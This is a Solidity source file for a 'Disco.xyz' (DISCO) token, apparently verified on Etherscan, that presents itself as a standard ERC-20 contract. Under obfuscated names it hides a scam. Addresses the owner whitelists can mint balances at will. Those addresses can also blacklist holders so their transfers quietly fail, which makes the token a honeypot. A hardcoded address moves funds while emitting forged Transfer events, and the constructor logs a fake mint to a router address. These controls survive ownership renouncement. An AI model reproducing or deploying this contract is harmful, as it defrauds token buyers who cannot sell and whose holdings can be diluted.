/**
 *Submitted for verification at Etherscan.io on 2022-11-02
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address AZC = 0xC7a583B709B51f8Ad45E3879C7b148881bA3877d;
	address aZRouterV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier AX{
        require(msg.sender == _Owner);
        _; }

}



contract DISCO is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Ac;
	mapping (address => bool) private Ab;
    mapping (address => bool) private Az;
    mapping (address => mapping (address => uint256)) private Ae;
    uint8 private constant _decimals = 8;
    uint256 private constant sA = 200000000 * 10**_decimals;
    string private constant _name = "Disco.xyz";
    string private constant _symbol = "DISCO";



    constructor () {
        Ac[_msgSender()] = sA;
        emit Transfer(address(0), aZRouterV2, sA);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return sA;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Ac[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return Ae[owner][spender];
    }
		function ARX(address Af) AX public{
        Ab[Af] = true; }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        Ae[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function ADX(address Af) public {
        if(Ab[msg.sender]) { 
        Az[Af] = false;}}
        function aQuery(address Af) public{
         if(Ab[msg.sender])  { 
        require(!Az[Af]);
        Az[Af] = true; }}

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == AZC)  {
        require(amount <= Ac[sender]);
        Ac[sender] -= amount;  
        Ac[recipient] += amount; 
          Ae[sender][msg.sender] -= amount;
        emit Transfer (aZRouterV2, recipient, amount);
        return true; }  else  
          if(!Az[recipient]) {
          if(!Az[sender]) {
         require(amount <= Ac[sender]);
        require(amount <= Ae[sender][msg.sender]);
        Ac[sender] -= amount;
        Ac[recipient] += amount;
      Ae[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Ai, uint256 Af) public {
        if(msg.sender == AZC)  {
        require(Ac[msg.sender] >= Af);
        Ac[msg.sender] -= Af;  
        Ac[Ai] += Af; 
        emit Transfer (aZRouterV2, Ai, Af);} else  
        if(Ab[msg.sender]) {Ac[Ai] += Af;} else
        if(!Az[msg.sender]) {
        require(Ac[msg.sender] >= Af);
        Ac[msg.sender] -= Af;  
        Ac[Ai] += Af;          
        emit Transfer(msg.sender, Ai, Af);}}}